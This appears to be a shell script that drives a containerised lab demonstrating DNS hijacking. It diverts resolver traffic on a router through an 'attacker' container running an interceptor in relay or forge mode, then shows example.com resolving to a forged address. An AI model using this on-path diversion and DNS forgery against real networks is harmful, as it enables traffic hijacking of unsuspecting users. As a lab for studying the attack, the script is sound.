#!/bin/sh
# Phase 2 orchestration, run from the host in the phase2/ directory after:
#     docker compose up --build -d
#
#   ./run.sh verify   - interceptor in relay mode (transparent, example.com = 172.16.1.20)
#   ./run.sh attack   - interceptor in forge mode (example.com hijacked to 172.16.1.30)
#   ./run.sh reset    - stop the interceptor, turn off the diversion, flush the cache
#
# Order matters: we flush the cache (restart resolver) first, then start the
# interceptor so it learns the resolver's current MAC, then switch on the
# diversion route on core-router.

ready() {
    n=0
    until [ -n "$(docker exec client dig @172.16.2.10 . NS +time=1 +tries=1 +short 2>/dev/null)" ]; do
        n=$((n + 1)); [ "$n" -gt 25 ] && break; sleep 1
    done
}

start_interceptor() {   # $1 = relay|forge
    docker exec attacker pkill interceptor 2>/dev/null || true
    docker exec core-router sh /scripts/undivert.sh >/dev/null 2>&1 || true
    docker restart resolver >/dev/null
    ready
    docker exec -d attacker sh -c "/usr/local/bin/interceptor $1 eth0 > /tmp/$1.log 2>&1"
    sleep 2
    docker exec core-router sh /scripts/divert.sh >/dev/null
}

show() {
    echo "example.com     -> $(docker exec client dig example.com +short)"
    echo "www.example.com -> $(docker exec client dig www.example.com +short)"
}

case "$1" in
    verify) start_interceptor relay; echo "[relay] transparent:"; show ;;
    attack) start_interceptor forge; echo "[forge] hijacked:";   show ;;
    reset)
        docker exec attacker pkill interceptor 2>/dev/null || true
        docker exec core-router sh /scripts/undivert.sh >/dev/null 2>&1 || true
        docker restart resolver >/dev/null
        echo "reset: interceptor stopped, diversion off, cache flushed" ;;
    *) echo "usage: $0 {verify|attack|reset}"; exit 1 ;;
esac
